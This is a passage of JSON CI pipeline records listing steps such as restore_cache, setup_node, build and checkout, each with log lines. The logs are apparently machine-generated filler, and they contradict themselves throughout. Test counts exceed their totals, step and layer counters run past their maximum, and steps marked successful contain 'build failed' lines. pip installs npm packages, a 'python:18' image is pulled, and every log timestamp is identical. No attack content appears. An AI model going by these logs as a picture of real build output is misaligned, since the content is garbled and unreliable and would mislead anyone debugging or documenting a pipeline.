          "Cache invalidated: node_modules",
          "[12:46:14] INFO: Connecting to database",
          "Loading...",
          "npm notice: package.json updated",
          "Switched to branch 'bugfix/task-590'",
          "Bundling runtime.css",
          "Step 7/23: Linting",
          "pip: Collecting axios",
          "Cache saved successfully",
          "pip install: Successfully installed lodash-1.7",
          "Step 1/21: Running migrations",
          "Exception: ValueError",
          "Using Python 3.12",
          "Optimizing 12 modules...",
          "Completed.",
          "[12:46:14] INFO: Starting build process",
          "pip: Installing build dependencies...",
          "npm install: added 465 packages",
          "Test Suites: 33 passed, 32 total",
          "Ready.",
          "[12:46:14] DEBUG: Initializing service",
          "[12:46:14] DEBUG: Loading configuration",
          "Compiling utils/index.js...",
          "[12:46:14] INFO: Processing request",
          "Done.",
          "[12:46:14] ERROR: Connection failed",
          "Loading...",
          "Fetching submodules...",
          "Artifact downloaded: 32MB",
          "Ready.",
          "Minifying vendor.js",
          "Platform: darwin-arm64",
          "[12:46:14] INFO: Processing request",
          "  PASS: test_user_create (52ms)",
          "Optimizing 36 modules...",
          "[12:46:14] DEBUG: Initializing service",
          "Creating production build...",
          "Ready.",
          "OK",
          "Image pulled successfully",
          "Step 4/23: Linting",
          "OK",
          "Step 1/21: Linting",
          "Generating source maps...",
          "npm install: resolved 235 packages",
          "FAILED: test_user_create",
          "Checking out master branch",
          "Image pulled successfully",
          "Transforming 448 files...",
          "GET /status - 200 (77ms)",
          "[12:46:14] INFO: Connecting to database",
          "[12:46:14] INFO: Request completed",
          "Using Node.js 15.10.3",
          "Compiling utils/app.ts...",
          "Compiling components/service.java...",
          "  PASS: test_user_create (80ms)",
          "Step 1/19: Installing dependencies",
          "=== Step install_dependencies completed ==="
        ]
      },
      {
        "name": "restore_cache",
        "status": "success",
        "started_at": "2025-12-16T12:47:26.888076",
        "finished_at": "2025-12-16T12:47:36.377018",
        "log_lines": [
          "=== Step: restore_cache ===",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "HEAD is now at 4e05847",
          "Ran 200 tests in 35s",
          "[12:46:14] DEBUG: Initializing service",
          "Loading...",
          "Compiling components/service.java...",
          "Compiling lib/handler.rs...",
          "npm install: added 261 packages",
          "[12:46:14] INFO: Connecting to database",
          "WARNING: eslint has known vulnerabilities",
          "Step 1/25: Building",
          "Installing express@5.16.5",
          "HEAD is now at f8f509b",
          "OK",
          "  PASS: test_user_create (87ms)",
          "[12:46:14] INFO: Request completed",
          "Done.",
          "Step 17/17: Deploying",
          "yarn add: Done in 20.19s",
          "Completed.",
          "npm install: added 134 packages",
          "Compiling components/index.js...",
          "Fetching submodules...",
          "GET /status - 200 (37ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Verifying...",
          "\u2713 All checks passed",
          "TLS handshake completed",
          "Environment: staging",
          "[12:46:14] INFO: Processing request",
          "Tests: 316 passed, 227 total",
          "Step 4/22: Building",
          "[12:46:14] INFO: Cache refreshed",
          "Artifact uploaded: build.tar.gz (6MB)",
          "Step 1/17: Deploying",
          "[12:46:14] INFO: Starting build process",
          "Ready.",
          "[12:46:14] WARN: Deprecated API usage",
          "Using Node.js 19.15.9",
          "Ready.",
          "[12:46:14] INFO: Connecting to database",
          "Completed.",
          "Compiling components/main.py...",
          "Compiling components/service.java...",
          "Exception: ValueError",
          "\u2713 All checks passed",
          "Fetching from https://docker.io/package.json",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "[12:46:14] DEBUG: Memory usage: 1321MB",
          "WARNING: axios has known vulnerabilities",
          "Completed.",
          "[12:46:14] DEBUG: Query executed in 35ms",
          "FAILED: test_api_health",
          "Artifact uploaded: build.tar.gz (17MB)",
          "Finished.",
          "\u2713 Step 'setup' succeeded",
          "Building Docker image...",
          "\u2713 Task completed in 4006ms",
          "\u2713 All checks passed",
          "Transforming 727 files...",
          "npm notice: package.json updated",
          "OK",
          "[12:46:14] ERROR: Connection failed",
          "  PASS: e2e/test_auth_login.spec.js",
          "Cache invalidated: dependencies",
          "Installing eslint@5.20.0",
          "[12:46:14] ERROR: Connection failed",
          "Connection established",
          "npm install: resolved 1414 packages",
          "Pulling image: alpine:3.11",
          "[12:46:14] INFO: Cache refreshed",
          "Completed.",
          "Cache restored successfully (328MB)",
          "Coverage: 81% statements, 74% branches",
          "[12:46:14] WARN: Deprecated API usage",
          "Compiling components/service.java...",
          "Coverage: 83% statements, 64% branches",
          "Artifact uploaded: dist.zip (92MB)",
          "Time: 28.331s",
          "Artifact downloaded: 6MB",
          "Fetching from https://pypi.org/package.json",
          "[12:46:14] DEBUG: Query executed in 40ms",
          "[12:46:14] DEBUG: Initializing service",
          "Completed.",
          "[12:46:14] INFO: Request completed",
          "npm notice: package.json updated",
          "Compiling components/main.py...",
          "WARNING: webpack has known vulnerabilities",
          "npm notice: package.json updated",
          "[12:46:14] INFO: Request completed",
          "[12:46:14] INFO: Starting build process",
          "\u2713 package completed",
          "[12:46:14] DEBUG: Memory usage: 315MB",
          "Ready.",
          "[12:46:14] ERROR: Connection failed",
          "Fetching from https://googleapis.com/package.json",
          "Step 1/25: Linting",
          "Tests: 400 passed, 488 total",
          "Connection established",
          "pip: Collecting react",
          "Pulling image: python:3.11",
          "Step 15/20: Testing",
          "Done.",
          "Step 2/15: Building",
          "TLS handshake completed",
          "Creating production build...",
          "[12:46:14] DEBUG: Memory usage: 625MB",
          "Test Suites: 10 passed, 13 total",
          "pip: Downloading prettier-1.17.tar.gz",
          "[12:46:14] DEBUG: Initializing service",
          "Artifact downloaded: 32MB",
          "Using Node.js 14.16.9",
          "Bundling styles.css",
          "OK",
          "Minifying main.js",
          "Artifact uploaded: dist.zip (11MB)",
          "Coverage: 79% statements, 77% branches",
          "[12:46:14] DEBUG: Query executed in 56ms",
          "HEAD is now at cf3ddf3",
          "Verifying...",
          "WARNING: prettier has known vulnerabilities",
          "Bundling vendor.js",
          "Cache restored successfully (269MB)",
          "Compiling utils/handler.rs...",
          "POST /upload - 200 (354ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Artifact uploaded: dist.zip (46MB)",
          "[12:46:14] INFO: Connecting to database",
          "pip install: Successfully installed lodash-1.6",
          "Step 12/18: Deploying",
          "Step 13/24: Linting",
          "Cache hit for key-4145",
          "\u2713 Step 'setup' succeeded",
          "Transforming 195 files...",
          "=== Step restore_cache completed ==="
        ]
      },
      {
        "name": "setup_node",
        "status": "success",
        "started_at": "2025-12-16T12:47:36.377018",
        "finished_at": "2025-12-16T12:47:52.191921",
        "log_lines": [
          "=== Step: setup_node ===",
          "  PASS: e2e/test_user_create.spec.js",
          "Success!",
          "WARNING: prettier has known vulnerabilities",
          "Cache restored successfully (190MB)",
          "Already up to date.",
          "Verifying...",
          "Verifying...",
          "Finished.",
          "[12:46:14] DEBUG: Connection pool: 18 active",
          "Compiling utils/app.ts...",
          "Layer 2/13: COPY command",
          "Compiling components/handler.rs...",
          "Fetching from https://registry.npmjs.org/package.json",
          "[12:46:14] INFO: Request completed",
          "Fetching from https://githubusercontent.com/package.json",
          "[12:46:14] INFO: Request completed",
          "Step 17/25: Linting",
          "[12:46:14] INFO: Request completed",
          "pip: Collecting prettier",
          "Ready.",
          "Compiling lib/handler.rs...",
          "Step 15/20: Building",
          "Already up to date.",
          "Compiling src/service.java...",
          "Finished.",
          "[12:46:14] DEBUG: Loading configuration",
          "Bundling styles.css",
          "Compiling lib/index.js...",
          "POST /upload - 201 (92ms)",
          "Compiling src/index.js...",
          "Building Docker image...",
          "Checking out master branch",
          "[12:46:14] DEBUG: Loading configuration",
          "yarn add: Done in 17.40s",
          "[12:46:14] INFO: Cache refreshed",
          "[12:46:14] WARN: Deprecated API usage",
          "[12:46:14] DEBUG: Loading configuration",
          "pip: Collecting lodash",
          "Using Node.js 15.11.0",
          "[12:46:14] INFO: Request completed",
          "pip: Installing build dependencies...",
          "[12:46:14] INFO: Connecting to database",
          "Processing...",
          "Finished.",
          "Image pulled successfully",
          "Success!",
          "Optimizing 95 modules...",
          "Exception: NullPointerException",
          "Waiting...",
          "[12:46:14] DEBUG: Connection pool: 16 active",
          "Bundling runtime.css",
          "Already up to date.",
          "Generating source maps...",
          "npm notice: package.json updated",
          "Artifact uploaded: build.tar.gz (31MB)",
          "npm install: resolved 627 packages",
          "\u2713 Step 'install' succeeded",
          "  PASS: test_api_health (388ms)",
          "[12:46:14] WARN: Deprecated API usage",
          "Cache miss for key-1511",
          "Optimizing 82 modules...",
          "[12:46:14] INFO: Processing request",
          "Waiting...",
          "\u2717 build failed with exit code 7",
          "[12:46:14] WARN: Deprecated API usage",
          "\u2713 All checks passed",
          "[12:46:14] DEBUG: Initializing service",
          "npm install: added 59 packages",
          "  PASS: unit/test_cache_hit.spec.js",
          "Image pulled successfully",
          "Exception: NullPointerException",
          "Loading...",
          "Artifact uploaded: build.tar.gz (34MB)",
          "Snapshots: 48 passed, 14 total",
          "[12:46:14] DEBUG: Connection pool: 18 active",
          "Building Docker image...",
          "[12:46:14] DEBUG: Initializing service",
          "[12:46:14] DEBUG: Initializing service",
          "Compiling components/index.js...",
          "Artifact downloaded: 6MB",
          "Switched to branch 'hotfix/task-866'",
          "Step 13/16: Testing",
          "yarn add: Done in 26.23s",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Minifying main.js",
          "Layer 1/14: COPY command",
          "Image pulled successfully",
          "pip: Installing build dependencies...",
          "Minifying vendor.js",
          "Loading...",
          "Step 2/23: Running migrations",
          "Environment: production",
          "Pulling image: node:18",
          "Uploading artifact 'build' (42 files)",
          "Ran 197 tests in 25s",
          "pip install: Successfully installed express-1.15",
          "[12:46:14] DEBUG: Connection pool: 13 active",
          "Bundling main.css",
          "Step 15/16: Linting",
          "Step 15/23: Deploying",
          "Layer 10/10: COPY command",
          "Artifact uploaded: build.tar.gz (17MB)",
          "[12:46:14] INFO: Connecting to database",
          "Snapshots: 21 passed, 30 total",
          "[12:46:14] INFO: Connecting to database",
          "Pulling image: alpine:3.11",
          "pip install: Successfully installed express-5.20",
          "Step 18/22: Deploying",
          "Using Node.js 17.1.1",
          "npm install: resolved 1950 packages",
          "Transforming 449 files...",
          "Transforming 876 files...",
          "NODE_ENV=production",
          "\u2713 All checks passed",
          "WARNING: eslint has known vulnerabilities",
          "  PASS: unit/test_auth_login.spec.js",
          "[12:46:14] INFO: Request completed",
          "Step 6/19: Running migrations",
          "Step 11/19: Running migrations",
          "[12:46:14] WARN: Deprecated API usage",
          "  PASS: integration/test_db_connect.spec.js",
          "Using Node.js 19.5.2",
          "Verifying...",
          "pip: Collecting react",
          "[12:46:14] DEBUG: Initializing service",
          "Loading...",
          "Cache miss for key-9475",
          "Tests: 479 passed, 220 total",
          "HEAD is now at 4a048cf",
          "npm install: resolved 207 packages",
          "\u2717 build failed with exit code 106",
          "Environment: test",
          "Using Node.js 20.2.2",
          "Using Python 3.12",
          "=== Step setup_node completed ==="
        ]
      },
      {
        "name": "e2e_tests",
        "status": "success",
        "started_at": "2025-12-16T12:47:52.191921",
        "finished_at": "2025-12-16T12:48:08.006824",
        "log_lines": [
          "=== Step: e2e_tests ===",
          "Loading...",
          "[12:46:14] INFO: Processing request",
          "[12:46:14] DEBUG: Loading configuration",
          "Artifact downloaded: 19MB",
          "Creating production build...",
          "Exception: NullPointerException",
          "[12:46:14] WARN: Deprecated API usage",
          "Transforming 671 files...",
          "Platform: darwin-arm64",
          "[12:46:14] DEBUG: Initializing service",
          "yarn add: Done in 11.10s",
          "Step 14/21: Linting",
          "pip: Collecting express",
          "pip: Installing build dependencies...",
          "npm notice: package.json updated",
          "npm notice: created a lockfile",
          "Processing...",
          "Pushing to registry...",
          "Compiling lib/service.java...",
          "Tests: 481 passed, 434 total",
          "Fetching from https://githubusercontent.com/package.json",
          "WARNING: express has known vulnerabilities",
          "OK",
          "POST /upload - 202 (210ms)",
          "GET /api - 201 (90ms)",
          "[12:46:14] INFO: Processing request",
          "  PASS: unit/test_auth_login.spec.js",
          "Environment: development",
          "Switched to branch 'feature/task-128'",
          "Pushing to registry...",
          "Processing...",
          "Loading...",
          "pip: Downloading eslint-4.4.tar.gz",
          "Fetching submodules...",
          "Transforming 286 files...",
          "Fetching submodules...",
          "\u2713 Step 'checkout' succeeded",
          "Uploading artifact 'coverage' (5 files)",
          "Using Node.js 20.16.8",
          "\u2713 All checks passed",
          "WARNING: jest has known vulnerabilities",
          "pip: Downloading express-3.16.tar.gz",
          "Pulling image: python:18",
          "Compiling src/app.ts...",
          "Layer 6/9: COPY command",
          "[12:46:14] INFO: Request completed",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Using Node.js 14.11.8",
          "[12:46:14] INFO: Starting build process",
          "Cache invalidated: build",
          "Bundling runtime.js",
          "[12:46:14] INFO: Request completed",
          "Artifact uploaded: build.tar.gz (46MB)",
          "Minifying app.js",
          "Step 3/17: Installing dependencies",
          "[12:46:14] DEBUG: Query executed in 98ms",
          "Compiling components/utils.go...",
          "[12:46:14] DEBUG: Loading configuration",
          "WARNING: axios has known vulnerabilities",
          "Step 3/16: Linting",
          "Fetching submodules...",
          "Already up to date.",
          "Uploading artifact 'dist' (10 files)",
          "Compiling src/app.ts...",
          "Loading...",
          "\u2713 All checks passed",
          "GET /status - 204 (52ms)",
          "Ready.",
          "Finished.",
          "Artifact uploaded: dist.zip (83MB)",
          "Cache miss for key-6706",
          "[12:46:14] WARN: Deprecated API usage",
          "TLS handshake completed",
          "pip install: Successfully installed lodash-5.9",
          "Uploading artifact 'coverage' (20 files)",
          "Platform: darwin-arm64",
          "Installing jest@5.10.5",
          "npm notice: package.json updated",
          "Verifying...",
          "Cache invalidated: build",
          "Compiling lib/main.py...",
          "  PASS: test_auth_login (362ms)",
          "Platform: darwin-arm64",
          "Already up to date.",
          "Test Suites: 36 passed, 24 total",
          "pip: Installing build dependencies...",
          "Success!",
          "Step 4/20: Building",
          "TLS handshake completed",
          "Test Suites: 6 passed, 24 total",
          "  PASS: test_cache_hit (403ms)",
          "pip: Downloading express-3.16.tar.gz",
          "[12:46:14] INFO: Processing request",
          "Completed.",
          "yarn add: Done in 3.58s",
          "GET /status - 204 (27ms)",
          "pip install: Successfully installed prettier-3.6",
          "[12:46:14] WARN: Deprecated API usage",
          "Processing...",
          "Cache hit for key-5989",
          "[12:46:14] INFO: Cache refreshed",
          "\u2717 build failed with exit code 25",
          "Cache miss for key-7483",
          "Ready.",
          "Platform: win32-x64",
          "  PASS: integration/test_api_health.spec.js",
          "Optimizing 55 modules...",
          "HEAD is now at 091a8dc",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Switched to branch 'bugfix/task-436'",
          "[12:46:14] INFO: Processing request",
          "Using Python 3.9",
          "Step 1/19: Building",
          "pip: Collecting express",
          "[12:46:14] INFO: Processing request",
          "[12:46:14] INFO: Connecting to database",
          "pip install: Successfully installed express-2.10",
          "\u2713 Step 'install' succeeded",
          "Done.",
          "Finished.",
          "WARNING: eslint has known vulnerabilities",
          "Step 12/17: Testing",
          "Waiting...",
          "Connection established",
          "Success!",
          "[12:46:14] WARN: Deprecated API usage",
          "OK",
          "Processing...",
          "Cache hit for key-4746",
          "Step 15/23: Testing",
          "[12:46:14] INFO: Cache refreshed",
          "Cache invalidated: dependencies",
          "npm install: added 302 packages",
          "npm notice: created a lockfile",
          "=== Step e2e_tests completed ==="
        ]
      },
      {
        "name": "build",
        "status": "success",
        "started_at": "2025-12-16T12:48:08.006824",
        "finished_at": "2025-12-16T12:48:55.451532",
        "log_lines": [
          "=== Step: build ===",
          "Artifact uploaded: build.tar.gz (37MB)",
          "Installing jest@3.6.5",
          "Loading...",
          "Cache miss for key-3067",
          "Compiling src/handler.rs...",
          "  PASS: integration/test_auth_login.spec.js",
          "Optimizing 48 modules...",
          "pip: Collecting react",
          "Image pulled successfully",
          "Image pulled successfully",
          "npm install: resolved 1067 packages",
          "Connection established",
          "GET /health - 200 (14ms)",
          "Platform: linux-x64",
          "NODE_ENV=development",
          "[12:46:14] DEBUG: Connection pool: 17 active",
          "Completed.",
          "Connection established",
          "Step 17/17: Running migrations",
          "npm install: resolved 1381 packages",
          "WARNING: eslint has known vulnerabilities",
          "Building Docker image...",
          "Completed.",
          "Building Docker image...",
          "Fetching from https://amazonaws.com/package.json",
          "\u2717 build failed with exit code 126",
          "Connection established",
          "Checking out develop branch",
          "  PASS: e2e/test_api_health.spec.js",
          "Layer 10/9: COPY command",
          "[12:46:14] DEBUG: Initializing service",
          "npm install: resolved 947 packages",
          "Cache invalidated: build",
          "[12:46:14] INFO: Cache refreshed",
          "\u2713 All checks passed",
          "Compiling utils/main.py...",
          "Layer 6/13: COPY command",
          "Image pulled successfully",
          "Success!",
          "npm install: added 442 packages",
          "pip: Downloading jest-1.13.tar.gz",
          "Bundling main.css",
          "[12:46:14] INFO: Cache refreshed",
          "[12:46:14] WARN: Deprecated API usage",
          "Step 13/15: Linting",
          "Done.",
          "WARNING: express has known vulnerabilities",
          "[12:46:14] INFO: Cache refreshed",
          "Installing jest@4.16.4",
          "\u2713 Step 'install' succeeded",
          "Compiling components/service.java...",
          "Creating production build...",
          "[12:46:14] DEBUG: Connection pool: 3 active",
          "[12:46:14] DEBUG: Query executed in 88ms",
          "Cache restored successfully (142MB)",
          "HEAD is now at 17430df",
          "Transforming 795 files...",
          "Cache miss for key-6151",
          "GET /api - 201 (70ms)",
          "Building Docker image...",
          "Creating production build...",
          "Step 19/22: Testing",
          "npm install: resolved 1286 packages",
          "Cache miss for key-5597",
          "Cache miss for key-2814",
          "GET /health - 204 (7ms)",
          "npm install: added 139 packages",
          "FAILED: test_auth_login",
          "[12:46:14] INFO: Starting build process",
          "Optimizing 67 modules...",
          "Using Node.js 20.10.3",
          "Image pulled successfully",
          "npm notice: package.json updated",
          "pip: Collecting webpack",
          "Image pulled successfully",
          "Completed.",
          "\u2713 All checks passed",
          "  PASS: test_api_health (450ms)",
          "Waiting...",
          "Cache miss for key-5173",
          "Switched to branch 'bugfix/task-876'",
          "GET /status - 200 (1ms)",
          "NODE_ENV=production",
          "Installing lodash@4.4.2",
          "Tests: 362 passed, 473 total",
          "[12:46:14] DEBUG: Memory usage: 1757MB",
          "\u2713 Task completed in 2580ms",
          "Step 1/25: Running migrations",
          "\u2713 All checks passed",
          "npm notice: package.json updated",
          "Environment: production",
          "[12:46:14] DEBUG: Loading configuration",
          "\u2713 Task completed in 953ms",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Success!",
          "[12:46:14] DEBUG: Memory usage: 989MB",
          "\u2717 build failed with exit code 52",
          "Building Docker image...",
          "npm notice: created a lockfile",
          "Artifact uploaded: build.tar.gz (18MB)",
          "[12:46:14] WARN: Deprecated API usage",
          "Ran 124 tests in 7s",
          "Cache restored successfully (466MB)",
          "HEAD is now at 8e096ec",
          "\u2713 All checks passed",
          "Loading...",
          "\u2713 All checks passed",
          "pip: Downloading jest-5.10.tar.gz",
          "\u2713 validate completed",
          "Pulling image: node:18",
          "npm notice: created a lockfile",
          "Generating source maps...",
          "Cache hit for key-2871",
          "npm notice: package.json updated",
          "Switched to branch 'feature/task-546'",
          "Pulling image: python:18",
          "Transforming 768 files...",
          "WARNING: eslint has known vulnerabilities",
          "pip install: Successfully installed jest-1.0",
          "Time: 120.478s",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Step 17/23: Running migrations",
          "[12:46:14] INFO: Request completed",
          "Completed.",
          "Cache restored successfully (150MB)",
          "Step 5/25: Testing",
          "Step 17/16: Testing",
          "Step 7/24: Linting",
          "Test Suites: 37 passed, 31 total",
          "Success!",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Coverage: 78% statements, 73% branches",
          "Ready.",
          "Step 9/15: Running migrations",
          "=== Step build completed ==="
        ]
      },
      {
        "name": "setup_environment",
        "status": "success",
        "started_at": "2025-12-16T12:48:55.451532",
        "finished_at": "2025-12-16T12:49:11.266435",
        "log_lines": [
          "=== Step: setup_environment ===",
          "[12:46:14] INFO: Connecting to database",
          "Minifying app.js",
          "Artifact uploaded: build.tar.gz (37MB)",
          "Step 1/25: Building",
          "[12:46:14] DEBUG: Loading configuration",
          "POST /data - 201 (324ms)",
          "npm notice: package.json updated",
          "Time: 87.681s",
          "Ran 161 tests in 38s",
          "HEAD is now at 841ddee",
          "\u2713 test completed",
          "HEAD is now at c9e5fa9",
          "Cache saved successfully",
          "npm notice: package.json updated",
          "Connection established",
          "npm install: added 204 packages",
          "pip install: Successfully installed react-5.18",
          "Step 7/21: Linting",
          "yarn add: Done in 11.65s",
          "pip: Downloading eslint-1.12.tar.gz",
          "Minifying main.js",
          "POST /data - 202 (295ms)",
          "[12:46:14] INFO: Cache refreshed",
          "[12:46:14] DEBUG: Loading configuration",
          "pip: Installing build dependencies...",
          "Using Node.js 19.14.3",
          "pip: Installing build dependencies...",
          "Ran 80 tests in 44s",
          "Generating source maps...",
          "Platform: darwin-arm64",
          "Compiling components/app.ts...",
          "[12:46:14] WARN: Deprecated API usage",
          "Cache saved successfully",
          "Installing eslint@1.16.9",
          "Platform: linux-x64",
          "Uploading artifact 'build' (48 files)",
          "\u2713 All checks passed",
          "pip: Installing build dependencies...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "\u2717 build failed with exit code 72",
          "[12:46:14] INFO: Starting build process",
          "Cache restored successfully (263MB)",
          "Pulling image: python:latest",
          "Connection established",
          "[12:46:14] WARN: Deprecated API usage",
          "NODE_ENV=development",
          "[12:46:14] INFO: Starting build process",
          "Done.",
          "[12:46:14] ERROR: Connection failed",
          "TLS handshake completed",
          "Cache hit for key-1717",
          "npm install: added 450 packages",
          "Platform: win32-x64",
          "Switched to branch 'feature/task-106'",
          "Coverage: 79% statements, 97% branches",
          "[12:46:14] DEBUG: Memory usage: 1805MB",
          "Waiting...",
          "Step 1/22: Installing dependencies",
          "Waiting...",
          "Test Suites: 35 passed, 37 total",
          "Connection established",
          "  PASS: test_user_create (157ms)",
          "Snapshots: 7 passed, 16 total",
          "pip install: Successfully installed eslint-3.19",
          "pip: Downloading prettier-2.19.tar.gz",
          "Exception: ValueError",
          "Time: 2.275s",
          "Cache saved successfully",
          "[12:46:14] DEBUG: Query executed in 13ms",
          "Generating source maps...",
          "Tests: 164 passed, 381 total",
          "[12:46:14] DEBUG: Initializing service",
          "Installing axios@3.2.7",
          "Processing...",
          "npm notice: created a lockfile",
          "FAILED: test_user_create",
          "Ready.",
          "Compiling src/utils.go...",
          "Switched to branch 'bugfix/task-538'",
          "Checking out develop branch",
          "npm install: resolved 1541 packages",
          "Step 3/20: Testing",
          "Step 13/15: Building",
          "Compiling utils/utils.go...",
          "Compiling lib/handler.rs...",
          "Cache hit for key-7969",
          "pip install: Successfully installed lodash-5.7",
          "Compiling lib/main.py...",
          "Artifact uploaded: build.tar.gz (11MB)",
          "Checking out main branch",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Coverage: 80% statements, 63% branches",
          "HEAD is now at 141971b",
          "\u2713 All checks passed",
          "\u2713 All checks passed",
          "WARNING: webpack has known vulnerabilities",
          "Checking out develop branch",
          "\u2713 Step 'install' succeeded",
          "Compiling components/main.py...",
          "Success!",
          "pip: Collecting axios",
          "Step 19/16: Linting",
          "Platform: darwin-arm64",
          "[12:46:14] DEBUG: Connection pool: 10 active",
          "Artifact uploaded: build.tar.gz (9MB)",
          "Generating source maps...",
          "[12:46:14] INFO: Request completed",
          "Environment: development",
          "Transforming 355 files...",
          "[12:46:14] INFO: Request completed",
          "NODE_ENV=test",
          "Step 7/20: Linting",
          "[12:46:14] DEBUG: Loading configuration",
          "Verifying...",
          "Ready.",
          "Layer 7/10: COPY command",
          "Checking out develop branch",
          "NODE_ENV=production",
          "Pushing to registry...",
          "Time: 47.238s",
          "Completed.",
          "Waiting...",
          "Success!",
          "Artifact downloaded: 3MB",
          "pip: Collecting express",
          "Installing express@1.13.6",
          "[12:46:14] DEBUG: Connection pool: 9 active",
          "\u2717 build failed with exit code 109",
          "Exception: NullPointerException",
          "pip install: Successfully installed react-5.0",
          "Pushing to registry...",
          "Already up to date.",
          "Using Python 3.12",
          "Artifact uploaded: build.tar.gz (9MB)",
          "=== Step setup_environment completed ==="
        ]
      },
      {
        "name": "checkout",
        "status": "success",
        "started_at": "2025-12-16T12:49:11.266435",
        "finished_at": "2025-12-16T12:49:17.592396",
        "log_lines": [
          "=== Step: checkout ===",
          "Verifying...",
          "[12:46:14] INFO: Starting build process",
          "Exception: RuntimeError",
          "Test Suites: 5 passed, 31 total",
          "Building Docker image...",
          "Waiting...",
          "\u2713 Step 'test' succeeded",
          "Uploading artifact 'coverage' (16 files)",
          "\u2713 Step 'setup' succeeded",
          "Layer 7/11: RUN command",
          "Compiling lib/handler.rs...",
          "NODE_ENV=production",
          "[12:46:14] ERROR: Connection failed",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "OK",
          "Step 5/17: Deploying",
          "Ran 54 tests in 13s",
          "[12:46:14] INFO: Request completed",
          "Cache hit for key-9528",
          "npm notice: created a lockfile",
          "Creating production build...",
          "Compiling lib/utils.go...",
          "Compiling utils/main.py...",
          "Checking out main branch",
          "Minifying app.js",
          "npm notice: package.json updated",
          "Checking out develop branch",
          "Loading...",
          "\u2713 All checks passed",
          "Loading...",
          "\u2713 Task completed in 1230ms",
          "Uploading artifact 'coverage' (50 files)",
          "Test Suites: 14 passed, 17 total",
          "\u2713 Step 'build' succeeded",
          "GET /api - 200 (51ms)",
          "OK",
          "Exception: TypeError",
          "npm install: added 356 packages",
          "Image pulled successfully",
          "Loading...",
          "Switched to branch 'hotfix/task-705'",
          "Already up to date.",
          "Bundling runtime.css",
          "  PASS: test_auth_login (96ms)",
          "pip: Installing build dependencies...",
          "Building Docker image...",
          "WARNING: webpack has known vulnerabilities",
          "\u2713 Task completed in 4404ms",
          "Verifying...",
          "npm notice: created a lockfile",
          "Success!",
          "Cache restored successfully (480MB)",
          "Pulling image: alpine:18",
          "[12:46:14] DEBUG: Connection pool: 14 active",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Coverage: 70% statements, 100% branches",
          "Test Suites: 44 passed, 19 total",
          "Cache miss for key-2930",
          "Step 4/18: Installing dependencies",
          "Platform: linux-x64",
          "Compiling components/utils.go...",
          "[12:46:14] WARN: Deprecated API usage",
          "WARNING: jest has known vulnerabilities",
          "Done.",
          "pip: Collecting jest",
          "Bundling runtime.css",
          "[12:46:14] WARN: Deprecated API usage",
          "Creating production build...",
          "\u2713 Step 'test' succeeded",
          "pip: Downloading eslint-2.18.tar.gz",
          "Cache hit for key-8222",
          "Creating production build...",
          "WARNING: prettier has known vulnerabilities",
          "Finished.",
          "Tests: 446 passed, 338 total",
          "Processing...",
          "WARNING: axios has known vulnerabilities",
          "[12:46:14] DEBUG: Initializing service",
          "Verifying...",
          "Ran 170 tests in 20s",
          "Cache miss for key-2120",
          "pip: Downloading eslint-4.1.tar.gz",
          "Finished.",
          "[12:46:14] DEBUG: Memory usage: 1288MB",
          "Optimizing 91 modules...",
          "[12:46:14] DEBUG: Query executed in 63ms",
          "Connection established",
          "Switched to branch 'feature/task-429'",
          "Installing webpack@1.0.8",
          "Step 4/17: Installing dependencies",
          "Step 2/24: Installing dependencies",
          "[12:46:14] WARN: Deprecated API usage",
          "Connection established",
          "  PASS: e2e/test_db_connect.spec.js",
          "  PASS: test_user_create (131ms)",
          "POST /data - 201 (104ms)",
          "  PASS: unit/test_auth_login.spec.js",
          "Environment: test",
          "Using Python 3.10",
          "  PASS: test_user_create (64ms)",
          "Fetching submodules...",
          "[12:46:14] INFO: Cache refreshed",
          "Generating source maps...",
          "Transforming 885 files...",
          "Using Node.js 15.2.3",
          "  PASS: e2e/test_user_create.spec.js",
          "Step 19/20: Installing dependencies",
          "Step 6/15: Deploying",
          "Waiting...",
          "Time: 115.423s",
          "pip install: Successfully installed prettier-4.6",
          "TLS handshake completed",
          "Bundling runtime.css",
          "pip install: Successfully installed express-3.15",
          "Finished.",
          "npm install: resolved 1695 packages",
          "POST /api - 202 (126ms)",
          "Environment: development",
          "NODE_ENV=test",
          "Uploading artifact 'dist' (32 files)",
          "pip: Installing build dependencies...",
          "Tests: 107 passed, 348 total",
          "pip: Installing build dependencies...",
          "HEAD is now at 380c1f7",
          "Cache invalidated: dependencies",
          "Optimizing 11 modules...",
          "Cache invalidated: node_modules",
          "npm install: resolved 150 packages",
          "Loading...",
          "\u2713 Task completed in 4308ms",
          "Cache invalidated: node_modules",
          "\u2713 deploy completed",
          "Coverage: 100% statements, 94% branches",
          "Installing lodash@4.20.4",
          "=== Step checkout completed ==="
        ]
      },
      {
        "name": "type_check",
        "status": "success",
        "started_at": "2025-12-16T12:49:17.592396",
        "finished_at": "2025-12-16T12:49:33.407299",
        "log_lines": [
          "=== Step: type_check ===",
          "Pushing to registry...",
          "Compiling components/utils.go...",
          "npm install: resolved 1297 packages",
          "NODE_ENV=production",
          "[12:46:14] INFO: Processing request",
          "Artifact downloaded: 37MB",
          "Compiling lib/utils.go...",
          "\u2713 Task completed in 1054ms",
          "Fetching from https://googleapis.com/package.json",
          "Connection established",
          "Generating source maps...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Using Python 3.10",
          "[12:46:14] INFO: Connecting to database",
          "Tests: 82 passed, 432 total",
          "POST /data - 201 (359ms)",
          "Processing...",
          "Optimizing 43 modules...",
          "[12:46:14] ERROR: Connection failed",
          "Cache miss for key-5493",
          "GET /status - 200 (6ms)",
          "npm notice: package.json updated",
          "Step 18/18: Running migrations",
          "Coverage: 81% statements, 91% branches",
          "\u2713 validate completed",
          "pip: Installing build dependencies...",
          "[12:46:14] INFO: Starting build process",
          "Platform: win32-x64",
